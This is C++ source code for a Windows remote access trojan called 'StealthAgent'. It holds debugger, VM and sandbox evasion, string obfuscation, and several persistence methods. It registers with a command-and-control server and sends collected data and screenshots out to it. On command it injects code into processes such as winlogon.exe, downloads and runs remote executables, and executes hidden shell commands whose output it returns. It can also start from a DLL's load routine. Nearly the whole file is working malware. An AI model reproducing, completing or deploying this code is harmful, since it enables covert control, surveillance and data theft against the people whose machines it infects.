#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <map>
#include <sstream>
#include <algorithm>
#include <iostream>
#include <fstream>
#include "evasion.h"
#include "injection.h"
#include "network.h"
#include "persistence.h"
#include "rat_features.h"

// Debug logging functions
void writeDebugLog(const std::string& message) {
    std::ofstream logFile("C:\\temp\\stealth_client_debug.log", std::ios::app);
    if (logFile.is_open()) {
        SYSTEMTIME st;
        GetSystemTime(&st);
        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
                << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "] "
                << message << std::endl;
        logFile.close();
    }
}

#define DEBUG_LOG(msg) writeDebugLog(msg)

// String obfuscation macros
#define OBFUSCATE(str) obfuscateString(str)
#define DECRYPT_STR(str) decryptString(str)

// Global variables
static bool g_isRunning = true;
static std::mt19937 g_rng(std::chrono::steady_clock::now().time_since_epoch().count());
static HANDLE g_mutex = NULL;

// String obfuscation functions
std::string obfuscateString(const std::string& str) {
    std::string result = str;
    for (size_t i = 0; i < result.length(); i++) {
        result[i] ^= (0xAA + (i % 256));
    }
    return result;
}

std::string decryptString(const std::string& str) {
    return obfuscateString(str); // XOR is symmetric
}

// Anti-debugging and VM detection
bool performEnvironmentChecks() {
    // Check for debugger
    if (IsDebuggerPresent()) return false;
    
    // Check for VM artifacts
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false; // VirtualBox detected
    }
    
    // Check for VMware
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false; // VMware detected
    }
    
    // Check system uptime (sandboxes often have low uptime)
    DWORD uptime = GetTickCount();
    if (uptime < 600000) return false; // Less than 10 minutes
    
    // Check for mouse movement (sandboxes often lack user interaction)
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    Sleep(1000);
    GetCursorPos(&pt2);
    if (pt1.x == pt2.x && pt1.y == pt2.y) {
        // No mouse movement, might be automated environment
        Sleep(5000); // Wait and check again
        GetCursorPos(&pt2);
        if (pt1.x == pt2.x && pt1.y == pt2.y) return false;
    }
    
    return true;
}

// Stealth sleep function with evasion
void stealthSleep(DWORD milliseconds) {
    DWORD sleepTime = milliseconds + (g_rng() % 2000); // Add random jitter
    
    // Split sleep into smaller chunks to avoid detection
    while (sleepTime > 0) {
        DWORD chunk = std::min((DWORD)sleepTime, (DWORD)(50 + (g_rng() % 150)));
        
        // Use different sleep methods randomly
        switch (g_rng() % 3) {
            case 0:
                Sleep(chunk);
                break;
            case 1: {
                HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
                if (hTimer) {
                    LARGE_INTEGER liDueTime;
                    liDueTime.QuadPart = -((LONGLONG)chunk * 10000);
                    SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0);
                    WaitForSingleObject(hTimer, INFINITE);
                    CloseHandle(hTimer);
                }
                break;
            }
            case 2: {
                DWORD startTime = GetTickCount();
                while ((GetTickCount() - startTime) < chunk) {
                    // Busy wait with legitimate operations
                    GetCurrentProcessId();
                    GetCurrentThreadId();
                }
                break;
            }
        }
        
        sleepTime -= chunk;
        
        // Perform some legitimate-looking operations
        GetTickCount();
        GetSystemMetrics(SM_CXSCREEN);
        GetTempPathA(0, NULL);
    }
}

// Mutex-based single instance check
bool ensureSingleInstance() {
    std::string mutexName = OBFUSCATE("Global\\{B7C1E4F2-8A3D-4E5F-9C2B-1A8E7D6F3C9E}");
    mutexName = DECRYPT_STR(mutexName);
    
    g_mutex = CreateMutexA(NULL, TRUE, mutexName.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (g_mutex) CloseHandle(g_mutex);
        return false;
    }
    
    return true;
}

// Main stealth agent class
class StealthAgent {
private:
    AdvancedEvasion evasion;
    AdvancedInjection injection;
    StealthNetwork network;
    StealthPersistence persistence;
    AdvancedRAT rat;
    bool initialized;
    std::string agentId;
    
public:
    StealthAgent() : initialized(false) {
        generateAgentId();
    }
    
    void generateAgentId() {
        // Generate unique agent ID based on system characteristics
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);
        
        char userName[UNLEN + 1];
        size = sizeof(userName);
        GetUserNameA(userName, &size);
        
        std::string combined = std::string(computerName) + "|" + std::string(userName);
        
        // Simple hash
        size_t hash = 0;
        for (char c : combined) {
            hash = hash * 31 + c;
        }
        
        std::stringstream ss;
        ss << std::hex << hash;
        agentId = ss.str();
    }
    
    bool initialize() {
        DEBUG_LOG("Starting agent initialization...");
        
        // Perform comprehensive evasion checks
        DEBUG_LOG("Performing environment checks...");
        if (!performEnvironmentChecks()) {
            DEBUG_LOG("Environment checks failed - debugger or VM detected");
            return false;
        }
        DEBUG_LOG("Environment checks passed");
        
        DEBUG_LOG("Checking advanced evasion...");
        if (!evasion.checkEnvironment()) {
            DEBUG_LOG("Advanced evasion checks failed");
            return false;
        }
        DEBUG_LOG("Advanced evasion checks passed");
        
        // Ensure single instance
        DEBUG_LOG("Checking for single instance...");
        if (!ensureSingleInstance()) {
            DEBUG_LOG("Another instance is already running");
            return false;
        }
        DEBUG_LOG("Single instance check passed");
        
        // Initialize network component
        DEBUG_LOG("Initializing network component...");
        network.initializeDefaults();
        DEBUG_LOG("Network component initialized");
        
        // Install persistence mechanisms
        DEBUG_LOG("Installing persistence mechanisms...");
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        DEBUG_LOG("Current executable path: " + std::string(currentPath));
        
        // Try multiple persistence methods
        bool persistenceInstalled = false;
        DEBUG_LOG("Attempting registry persistence...");
        persistenceInstalled |= persistence.installRegistryPersistence(currentPath, true);
        DEBUG_LOG("Attempting scheduled task persistence...");
        persistenceInstalled |= persistence.installScheduledTaskPersistence(currentPath);
        DEBUG_LOG("Attempting startup folder persistence...");
        persistenceInstalled |= persistence.installStartupFolderPersistence(currentPath);
        
        if (persistenceInstalled) {
            DEBUG_LOG("At least one persistence method installed successfully");
        } else {
            DEBUG_LOG("All persistence methods failed");
        }
        
        // Start RAT features
        DEBUG_LOG("Starting RAT features...");
        if (!rat.startRAT()) {
            DEBUG_LOG("RAT features failed to start, continuing anyway");
        } else {
            DEBUG_LOG("RAT features started successfully");
        }
        
        initialized = true;
        DEBUG_LOG("Agent initialization completed successfully!");
        return true;
    }
    
    void run() {
        if (!initialized) {
            DEBUG_LOG("Agent not initialized, cannot run");
            return;
        }
        
        DEBUG_LOG("Starting agent main loop...");
        
        // Initial check-in
        performInitialCheckin();
        
        int loopCount = 0;
        while (g_isRunning) {
            try {
                loopCount++;
                DEBUG_LOG("Main loop iteration #" + std::to_string(loopCount));
                
                // Send heartbeat to server
                std::string heartbeatPayload = "{\"uuid\":\"" + agentId + "\"}";
                std::string endpoint = "/api/info/client-heartbeat";
                std::string response = network.makeStealthRequest(endpoint, heartbeatPayload, "POST");
                
                if (!response.empty()) {
                    DEBUG_LOG("Heartbeat successful: " + response);
                    processCommands(response);
                } else {
                    DEBUG_LOG("Heartbeat failed - no response from server");
                }
                
                // Send collected data
                sendCollectedData();
                
                // Shorter delay for testing (10-30 seconds)
                DWORD delay = 10000 + (g_rng() % 20000);
                DEBUG_LOG("Sleeping for " + std::to_string(delay/1000) + " seconds...");
                stealthSleep(delay);
                
                // Occasionally perform traffic obfuscation
                if (g_rng() % 8 == 0) {
                    DEBUG_LOG("Performing traffic obfuscation...");
                    network.performTrafficObfuscation();
                }
                
                // Periodic environment checks
                if (g_rng() % 20 == 0) {
                    DEBUG_LOG("Performing environment checks...");
                    if (!performEnvironmentChecks()) {
                        DEBUG_LOG("Environment checks failed, stopping agent");
                        g_isRunning = false;
                        break;
                    }
                }
                
            } catch (...) {
                DEBUG_LOG("Exception in main loop, waiting before retry...");
                stealthSleep(60000 + (g_rng() % 60000)); // Wait 1-2 minutes on error
            }
        }
        
        DEBUG_LOG("Agent main loop ended");
    }
    
    void performInitialCheckin() {
        try {
            DEBUG_LOG("Starting initial client registration...");
            
            // Get system information
            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(computerName);
            GetComputerNameA(computerName, &size);
            
            char userName[UNLEN + 1];
            size = sizeof(userName);
            GetUserNameA(userName, &size);
            
            // Get IP address (simplified)
            std::string ipAddress = "127.0.0.1"; // Will be updated by server
            
            // Get OS info
            OSVERSIONINFOA osvi;
            ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
            GetVersionExA(&osvi);
            
            std::string platform = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion);
            std::string systemDetails = platform + " (Build " + std::to_string(osvi.dwBuildNumber) + ")";
            
            DEBUG_LOG("Client info - UUID: " + agentId + ", Computer: " + std::string(computerName) + ", User: " + std::string(userName));
            
            // Create JSON payload for registration
            std::string payload = "{";
            payload += "\"uuid\":\"" + agentId + "\",";
            payload += "\"computerName\":\"" + std::string(computerName) + "\",";
            payload += "\"ipAddress\":\"" + ipAddress + "\",";
            payload += "\"hostname\":\"" + std::string(computerName) + "\",";
            payload += "\"platform\":\"" + platform + "\",";
            payload += "\"additionalSystemDetails\":\"" + systemDetails + "\"";
            payload += "}";
            
            DEBUG_LOG("Registration payload: " + payload);
            
            // Use correct backend endpoint
            std::string endpoint = "/api/info/register-client";
            std::string response = network.makeStealthRequest(endpoint, payload, "POST");
            
            if (!response.empty()) {
                DEBUG_LOG("Registration successful! Response: " + response);
            } else {
                DEBUG_LOG("Registration failed - no response from server");
            }
            
        } catch (...) {
            DEBUG_LOG("Exception during initial checkin");
        }
    }
    
    void sendCollectedData() {
        try {
            auto collectedData = rat.getCollectedData();
            
            for (const auto& data : collectedData) {
                std::string endpoint = "/api/agent/" + agentId + "/data";
                std::string payload = data.type + "|" + data.timestamp + "|" + 
                                    std::string(data.data.begin(), data.data.end());
                
                network.makeStealthRequest(endpoint, payload, "POST");
                
                // Small delay between uploads
                stealthSleep(1000 + (g_rng() % 2000));
            }
        } catch (...) {
            // Ignore data upload failures
        }
    }
    
    void processCommands(const std::string& commands) {
        // Parse JSON-like command structure
        if (commands.find("\"cmd\":\"screenshot\"") != std::string::npos) {
            executeScreenshotCommand();
        }
        else if (commands.find("\"cmd\":\"sysinfo\"") != std::string::npos) {
            executeSysInfoCommand();
        }
        else if (commands.find("\"cmd\":\"inject\"") != std::string::npos) {
            executeInjectionCommand(commands);
        }
        else if (commands.find("\"cmd\":\"download\"") != std::string::npos) {
            executeDownloadCommand(commands);
        }
        else if (commands.find("\"cmd\":\"execute\"") != std::string::npos) {
            executeShellCommand(commands);
        }
        else if (commands.find("\"cmd\":\"persist\"") != std::string::npos) {
            executePeristenceCommand();
        }
        else if (commands.find("\"cmd\":\"exit\"") != std::string::npos) {
            g_isRunning = false;
        }
    }
    
    void executeScreenshotCommand() {
        try {
            auto screenshot = rat.captureScreenshot();
            std::string endpoint = "/api/agent/" + agentId + "/screenshot";
            std::string payload = std::string(screenshot.data.begin(), screenshot.data.end());
            network.makeStealthRequest(endpoint, payload, "POST");
        } catch (...) {}
    }
    
    void executeSysInfoCommand() {
        try {
            auto sysinfo = rat.getSystemInfo();
            std::string endpoint = "/api/agent/" + agentId + "/sysinfo";
            std::string payload = std::string(sysinfo.data.begin(), sysinfo.data.end());
            network.makeStealthRequest(endpoint, payload, "POST");
        } catch (...) {}
    }
    
    void executeInjectionCommand(const std::string& command) {
        try {
            std::vector<std::string> targets = {"notepad.exe", "explorer.exe", "winlogon.exe", "svchost.exe"};
            DWORD targetPid = injection.findTargetProcess(targets);
            
            if (targetPid > 0) {
                // Create simple shellcode (in practice, load from C2)
                std::vector<BYTE> shellcode = {
                    0x48, 0x31, 0xC0,           // xor rax, rax
                    0x48, 0x83, 0xC0, 0x3C,     // add rax, 60
                    0x48, 0x83, 0xEC, 0x20,     // sub rsp, 32
                    0x48, 0x83, 0xC4, 0x20,     // add rsp, 32
                    0xC3                        // ret
                };
                
                // Try different injection methods
                bool success = false;
                success |= injection.threadHijacking(targetPid, shellcode);
                if (!success) {
                    success |= injection.manualDllMapping(targetPid, shellcode);
                }
                
                // Report result back to C2
                std::string result = success ? "injection_success" : "injection_failed";
                std::string endpoint = "/api/agent/" + agentId + "/result";
                network.makeStealthRequest(endpoint, result, "POST");
            }
        } catch (...) {}
    }
    
    void executeDownloadCommand(const std::string& command) {
        // Extract URL from command (simplified parsing)
        size_t urlStart = command.find("\"url\":\"");
        if (urlStart != std::string::npos) {
            urlStart += 7;
            size_t urlEnd = command.find("\"", urlStart);
            if (urlEnd != std::string::npos) {
                std::string url = command.substr(urlStart, urlEnd - urlStart);
                
                // Download and execute
                std::string response = network.makeStealthRequest(url);
                if (!response.empty()) {
                    // Save to temp file and execute
                    char tempPath[MAX_PATH];
                    GetTempPathA(MAX_PATH, tempPath);
                    std::string filePath = std::string(tempPath) + "\\update.exe";
                    
                    std::vector<BYTE> data(response.begin(), response.end());
                    if (FileOperations::writeFile(filePath, data)) {
                        // Execute in separate process
                        STARTUPINFOA si = {0};
                        PROCESS_INFORMATION pi = {0};
                        si.cb = sizeof(si);
                        
                        CreateProcessA(filePath.c_str(), NULL, NULL, NULL, FALSE, 
                                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                        
                        if (pi.hProcess) {
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);
                        }
                    }
                }
            }
        }
    }
    
    void executeShellCommand(const std::string& command) {
        // Extract command from JSON
        size_t cmdStart = command.find("\"command\":\"");
        if (cmdStart != std::string::npos) {
            cmdStart += 11;
            size_t cmdEnd = command.find("\"", cmdStart);
            if (cmdEnd != std::string::npos) {
                std::string shellCmd = command.substr(cmdStart, cmdEnd - cmdStart);
                
                // Execute command and capture output
                HANDLE hReadPipe, hWritePipe;
                SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
                
                if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);
                    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                    si.hStdOutput = hWritePipe;
                    si.hStdError = hWritePipe;
                    si.wShowWindow = SW_HIDE;
                    
                    std::string cmdLine = "cmd.exe /c " + shellCmd;
                    
                    if (CreateProcessA(NULL, const_cast<char*>(cmdLine.c_str()), NULL, NULL, 
                                     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                        
                        CloseHandle(hWritePipe);
                        
                        // Read output
                        std::string output;
                        char buffer[4096];
                        DWORD bytesRead;
                        
                        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                            buffer[bytesRead] = '\0';
                            output += buffer;
                        }
                        
                        WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout
                        
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        
                        // Send output back to C2
                        std::string endpoint = "/api/agent/" + agentId + "/output";
                        network.makeStealthRequest(endpoint, output, "POST");
                    }
                    
                    CloseHandle(hReadPipe);
                }
            }
        }
    }
    
    void executePeristenceCommand() {
        try {
            char currentPath[MAX_PATH];
            GetModuleFileNameA(NULL, currentPath, MAX_PATH);
            
            // Install additional persistence methods
            bool success = false;
            success |= persistence.installWMIEventPersistence(currentPath);
            success |= persistence.installServicePersistence(currentPath);
            
            std::string result = success ? "persistence_installed" : "persistence_failed";
            std::string endpoint = "/api/agent/" + agentId + "/result";
            network.makeStealthRequest(endpoint, result, "POST");
        } catch (...) {}
    }
    
    ~StealthAgent() {
        if (initialized) {
            rat.stopRAT();
        }
        
        if (g_mutex) {
            CloseHandle(g_mutex);
        }
    }
};

// Entry points
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // For debugging, show console window
    AllocConsole();
    freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
    freopen_s((FILE**)stderr, "CONOUT$", "w", stderr);
    freopen_s((FILE**)stdin, "CONIN$", "r", stdin);
    
    DEBUG_LOG("=== STEALTH CLIENT STARTING ===");
    std::cout << "Stealth Client Debug Mode - Check C:\\temp\\stealth_client_debug.log for detailed logs" << std::endl;
    
    // Create temp directory if it doesn't exist
    CreateDirectoryA("C:\\temp", NULL);
    
    // Initialize COM for WMI operations
    DEBUG_LOG("Initializing COM...");
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    StealthAgent agent;
    DEBUG_LOG("Created StealthAgent instance");
    
    if (agent.initialize()) {
        DEBUG_LOG("Agent initialized successfully, starting main loop...");
        std::cout << "Agent initialized successfully! Running..." << std::endl;
        agent.run();
    } else {
        DEBUG_LOG("Agent initialization failed!");
        std::cout << "Agent initialization failed!" << std::endl;
    }
    
    DEBUG_LOG("Agent stopped, cleaning up...");
    CoUninitialize();
    DEBUG_LOG("=== STEALTH CLIENT STOPPED ===");
    
    std::cout << "Press any key to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}

// DLL entry point for DLL version
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // Disable DLL thread notifications
            DisableThreadLibraryCalls(hModule);
            
            // Start agent in separate thread
            std::thread([]() {
                CoInitializeEx(NULL, COINIT_MULTITHREADED);
                
                StealthAgent agent;
                if (agent.initialize()) {
                    agent.run();
                }
                
                CoUninitialize();
            }).detach();
            break;
        }
        case DLL_PROCESS_DETACH:
            g_isRunning = false;
            break;
    }
    return TRUE;
}